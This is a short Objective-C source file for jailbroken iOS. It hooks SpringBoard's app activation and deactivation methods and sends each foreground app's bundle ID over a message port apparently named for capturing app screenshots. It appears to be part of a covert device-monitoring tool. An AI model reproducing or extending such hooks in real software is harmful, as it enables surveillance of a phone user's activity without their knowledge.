//
//  AppScreenshot.h
//  MSFSP
//
//  Created by Makara Khloth on 1/5/17.
//
//

#import "MSFSP.h"

#import "SBApplication+iOS8.h"
#import "SBApplication+iOS9.h"

#import "MessagePortIPCSender.h"

void applicationStateChanged(NSDictionary *aNewState) {
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        NSData *rawData = [NSKeyedArchiver archivedDataWithRootObject:aNewState];
        if (rawData) {
            MessagePortIPCSender *messagePortSender = [[MessagePortIPCSender alloc] initWithPortName:@"AppScreenShotMsgPort"];
            [messagePortSender writeDataToPort:rawData];
            [messagePortSender release];
        }
    });
}

// iOS 8 + 9 - This method call one time only when app come to foreground
HOOK(SBApplication, willActivate_ASS, void) {
    DLog(@"willActivate_ASS");
    CALL_ORIG(SBApplication, willActivate_ASS);
    
    NSDictionary *newState = @{@"state": @1, @"bundleID": self.bundleIdentifier};
    applicationStateChanged(newState);
}

HOOK(SBApplication, willDeactivateForEventsOnly_ASS$, void, _Bool arg1) {
    DLog(@"willDeactivateForEventsOnly_ASS$");
    CALL_ORIG(SBApplication, willDeactivateForEventsOnly_ASS$, arg1);
    
    NSDictionary *newState = @{@"state": @2, @"bundleID": self.bundleIdentifier};
    applicationStateChanged(newState);
}
